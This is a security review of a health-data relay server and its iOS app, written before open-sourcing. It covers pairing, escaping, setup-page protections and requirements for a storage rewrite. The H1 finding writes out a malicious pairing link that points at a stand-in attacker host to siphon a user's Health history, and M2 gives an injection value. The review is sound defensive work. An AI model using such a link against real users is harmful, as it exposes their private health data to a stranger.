# Security review before open-sourcing

Reviewed: `origin/main` at af449a1 (server 0.4.x, iOS app 0.4.1), 2026-10-17. Branch
`oss/security` holds the fixes listed as **fixed**. Health data is the payload, so anything
that can send it to the wrong place, or let a stranger read or write it, counts as high.

Tools: `go vet`, `staticcheck` 2026.2.1 (clean), `gosec` 2.29.0 (findings triaged below),
`govulncheck` 1.9.0 (stdlib only, see M3), `go test -race`, Xcode 27 unit tests and the
setup-flow UI test on a simulator, a full `git log -p --all` scan.

## Summary

| ID | Severity | Where | Issue | Status |
|----|----------|-------|-------|--------|
| H1 | High | iOS `AppModel.open` | Any `healthrelay://pair` link paired silently with the server it names and sent it all Health history | **fixed** |
| M1 | Medium | `address.go`, iOS ATS | Plain HTTP is offered and accepted on the LAN: token, admin password form and health data in clear | open (design) |
| M2 | Medium | `forward.go` `escape` | Line-protocol injection: a trailing backslash in a source name, unit or record value name shifted tags and fields | **fixed** |
| M3 | Medium | toolchain | Go 1.26.8 (pinned nixpkgs): 11 stdlib vulns reachable, fixed in 1.26.9 | open |
| M4 | Medium | `setup.go` `clientAddr` | `-setup-from private` trusts every loopback peer: a local tunnel that adds no X-Forwarded-For makes the internet "private" | open (docs) |
| M5 | Medium | `model.go`, storage | Sample and deletion `type` strings are not validated; harmless today, path traversal once storage partitions by type | requirement for storage rewrite |
| M6 | Medium | `archive.go` | Archive files 0640, directories 0750: health data readable by the service's group | requirement for storage rewrite |
| L1 | Low | `pair.go` | Device name/model from the pairing caller could carry terminal escape sequences and line breaks (CLI `devices`, logs) | **fixed** |
| L2 | Low | `pair.go` | `/v1/pair` 500 answered unauthenticated callers with server file paths | **fixed** |
| L3 | Low | `setup.go` | Setup forms had no cross-origin check (SameSite=Strict does not cover other ports/subdomains); no X-Frame-Options; forms parsed up to 10 MB before auth | **fixed** |
| L4 | Low | auth | No rate limiting of token guesses; only the human-chosen server token (min 16 chars) is guessable | open |
| L5 | Low | `handler.go` | `/metrics` is unauthenticated: device count, record count, time of last upload | open |
| L6 | Low | `handler.go`, storage | No per-device quota: a paired device (or stolen token) can fill the disk, 32 MB per request | requirement for storage rewrite |
| L7 | Low | `model.go` | Deletions are not scoped to the device that sent the sample; any device can tombstone any UUID | requirement for erase |
| L8 | Low | iOS `ServerClient` | Server-supplied error text (up to 200-300 bytes) is shown verbatim | accepted |
| I1 | Info | `pair.go` | Revoke drops the device from memory before saving; if the save fails it returns 500 and the device comes back at restart | accepted |

## Fixed on this branch

- **H1** (iOS): a link for a server other than the current one now waits for the user:
  an alert names the host ("Health Relay will send all your Health data to <host>…"), and
  warns when it is plain HTTP. Re-pairing with the current server does not ask (it already
  has the data). Before, a web page or message could open
  `healthrelay://pair?server=https://evil.example&code=x`; one tap on Safari's "Open in
  Health Relay?" prompt made the app pair with any server answering `POST /v1/pair`, reset
  its anchors and, with Health access already granted, upload the whole history. Custom URL
  schemes are not exclusive to one app either. The old token was never sent to a different
  server (`replaces` is only set for the same server; the new test checks it). Tests:
  `AppModelTests.testLinkToAnotherServerWaitsForConfirmation`, `testUnencryptedLinkIsFlagged`;
  `SetupFlowUITests` taps Connect (screenshot `2b-confirm-server`).
- **M2**: `escape` now escapes backslashes and turns all control characters into spaces.
  Source names come from any app writing to Health on the phone, record value names from
  the client; e.g. source `Watch\` made `source=Watch\,unit=count/min` one tag. Test:
  `TestLinesEscapeClientStrings`.
- **L1, L2**: `/v1/pair` rejects control characters in name and model (400) and logs save
  errors instead of returning them. Test: `TestPairRejectsControlCharactersInNames`.
- **L3**: `POST /setup` and `POST /setup/revoke` refuse requests a browser marks
  `Sec-Fetch-Site: cross-site` or `same-site` (no header, as from curl, still passes), cap
  the form at 16 KB, and pages send `X-Frame-Options: DENY` next to the CSP
  `frame-ancestors 'none'`. Test: `TestSetupFormsRefuseCrossOrigin`.

## Open findings and what to do

**M1, plain HTTP.** Without `-public-url`, `addresses()` offers `http://<LAN IP>:<port>`,
and the app's ATS has `NSAllowsLocalNetworking` (IP literals bypass ATS anyway). On a
home LAN, the device token, every batch of health data, the server token typed into
`/setup` and the session cookie (no `Secure` over HTTP) cross the network in clear.
Tailscale IPs and `*.ts.net` names are fine (WireGuard, or TLS). Recommended:
label plain-HTTP LAN addresses "unencrypted" on the setup page and in `pair`, list them after
Tailscale ones, and say in the README that a LAN address without TLS is for trusted networks
only; the app now warns at link confirmation. Not changed here because it alters the setup
UX and tests in `address.go`.

**M3, toolchain.** `govulncheck` reports GO-2026-6599/6600 (html/template, reached by the
setup page), GO-2026-6603/6610/6611/6612/6613/6617 (net/http; the HTTP/2 ones are not
reachable since the server never terminates TLS), GO-2026-6605/6607/6608. All fixed in Go
1.26.9. Bump `flake.lock` once nixpkgs has 1.26.9 (unstable still had 1.26.8 today), and run
`govulncheck ./...` in CI. Zero third-party modules today; keep it that way or vet each one.

**M4, who counts as private.** `clientAddr` takes the last X-Forwarded-For hop only when the
peer is loopback, which is right for Tailscale serve and Caddy. A local proxy that does not
add the header (`ssh -R`, socat, some tunnel agents) makes every client loopback. Impact is
limited (pairing still needs a 120-bit code, signing in needs the server token), but say it
in the README next to `-setup-from`, or add `-trusted-proxy` and treat a loopback peer
without X-Forwarded-For as unknown when it is set.

**L4, guessing.** Device tokens (256 bits) and setup codes (120 bits) cannot be guessed. The
server token is chosen by the operator; `/setup` sleeps 500 ms per wrong try, but in
parallel, and bearer endpoints (`/v1/status`, `/v1/samples`) answer at full speed. A limiter
that only slows failures does not help (the right guess still gets 200). Recommended: document
`openssl rand -base64 32` for the token file and raise the minimum length to 32, or add a
per-client-address limiter in `caller()`.

**L5, /metrics.** Counts only, no health values, but the last-upload timestamp tells when
the phone is in use. Fine on loopback behind a proxy that does not expose it; otherwise
require the server token, or document it.

**http.Server** (`main.go`): timeouts are set (ReadHeader 10 s, Read and Write 2 min, Idle
2 min). Optional: `MaxHeaderBytes: 64 << 10` (default 1 MB). There is no gzip decoding, so
no decompression bombs; Go's JSON decoder caps nesting; upload bodies are read only after
authentication.

## Requirements for the storage rewrite (Parquet + SQLite staging, erase endpoint)

Today records go to `<dir>/YYYY/YYYY-MM-DD.jsonl` named by server time, so no client string
reaches a path. The rewrite must keep that property.

1. **Paths from client strings.** HealthKit `type` (samples, deletions) is any string up to
   the body limit; record `kind` is checked by `kindRE`. Before a type names a partition,
   directory, file or table, validate it against an allow-list regex such as
   `^HK[A-Za-z0-9]{1,120}$` (and `kindRE` for kinds), reject anything else with 400 in the
   validation pass (batches are all-or-nothing), and still never `filepath.Join` raw input:
   open files through `os.OpenRoot(archiveDir)` (Go 1.24) so `..`, absolute paths and symlinks
   cannot escape. Date partitions come from server time or a parsed `time.Time` with a sane
   year range (HealthKit dates can be anything; years past 2262 overflow `UnixNano`).
2. **Partition count.** Cap distinct partitions (types × days) per batch and overall: 100k
   distinct valid-looking type strings would otherwise create 100k files and exhaust inodes
   or file descriptors. Keep an upper bound on open Parquet writers.
3. **SQL.** Parameters only (`?`), never `fmt.Sprintf` with client strings; no table per type
   unless the name passes (1) and is quoted. SQLite driver must be pure Go
   (`modernc.org/sqlite` or similar): the flake builds with `CGO_ENABLED=0`. Run govulncheck
   on the new modules and commit `go.sum`.
4. **File permissions.** Directories 0700, files 0600 (Parquet, SQLite, `-wal`, `-shm`,
   temp files), set explicitly rather than trusting the umask; `devices.json` already does
   this. Fixes M6 for the new layout; existing `.jsonl` files can be `chmod`ed on start.
5. **Erase authz.** `erase all data for this device`:
   - a device token erases only its own device (ID from `caller()`, never from the body or
     path); the server token may erase any device by ID; the setup page, if it offers erase,
     goes through `setupForm` (cross-origin check) and the admin session;
   - uploads made with the server token have no device: say what erase means for them (an
     admin-only "unattributed" erase, or nothing);
   - records must carry the device ID from now on (today they do not; see L7), and deletions
     from one device must not tombstone another device's samples;
   - require an explicit confirmation field (e.g. `{"device_id": "<own id>"}`) so a stray
     request cannot erase; make it idempotent; log `erased device <id>: N records` and
     nothing else; revoke the token in the same step, or say why not.
6. **Erase completeness.** Remove the data from staging SQLite (with `PRAGMA secure_delete=ON`
   then `VACUUM`, and a WAL checkpoint, or deleted rows stay in free pages and the WAL),
   from Parquet files (rewrite affected files, fsync, rename, then remove the old ones), from
   the in-memory dedupe index, and from old `.jsonl` archives. A crash mid-erase must not
   leave a state where compaction brings erased rows back from staging. Metrics already
   forwarded to VictoriaMetrics are not erased: say so in the API docs and the app.
7. **Resource limits.** Keep the 32 MB body limit and add: a maximum number of records per
   batch, a maximum size per record (file chunks), a per-device storage quota or rate, a
   free-disk check that answers 507 rather than half-writing, bounded memory per Parquet
   writer, and context timeouts on database work tied to the request.
8. **Logs.** Keep logging types, counts and keys only; no values, no record JSON in errors
   (the `badRequest` messages are returned to the client and logged).

## Checked and fine

- Pairing codes: 120 random bits (crypto/rand), single use, 15 min default and 24 h max,
  held in memory as SHA-256, at most 50 live, voided by a restart; case/dash-insensitive.
- Device tokens: 256 random bits; only SHA-256 stored (`devices.json`, 0600, atomic write
  with fsync); revocation takes effect on the next request (no caches). SHA-256 without salt
  is fine for 256-bit random tokens.
- Server token: compared with `subtle.ConstantTimeCompare`; admin endpoints
  (`/v1/pairing-codes`, `/v1/devices`, `DELETE /v1/devices/{id}`) require it; device tokens
  get only uploads and `/v1/status`.
- Setup page: needs the server token (session cookie: 256-bit ID, HttpOnly, SameSite=Strict,
  1 h, `Secure` behind HTTPS) or a valid code; strict CSP with a per-response script nonce;
  `html/template` everywhere. gosec G203 on `template.URL`/`template.HTML` is a false
  positive: the link is built with `url.Values`, the SVG from QR modules only, and the
  `server` query parameter only selects among addresses the server found itself.
- Forwarding: the URL comes from flags only (no SSRF), 15 s timeout, Go drops the
  Authorization header on cross-host redirects.
- Logs (server and app): no tokens, no health values. The app's log file is shareable from
  Advanced and contains types, counts, hosts and device IDs.
- iOS: Keychain items use `kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly` (needed for
  background sync; not synced or restored to another device); anchors and logs use
  `completeUntilFirstUserAuthentication`; no health data is kept on the phone; default
  certificate validation (no custom trust handling); ATS relaxed for local networking only.
- Other gosec findings: G304 (paths from flags, by design), G204 (`tailscale` from PATH with
  fixed arguments), G104 (unchecked errors on response writes and cleanup).
- Git history (14 commits, all branches): no tokens, keys, real host or tailnet names, team
  IDs or bundle IDs; fixtures use documentation addresses. Commits carry the author's
  personal e-mail address, which is public once pushed.
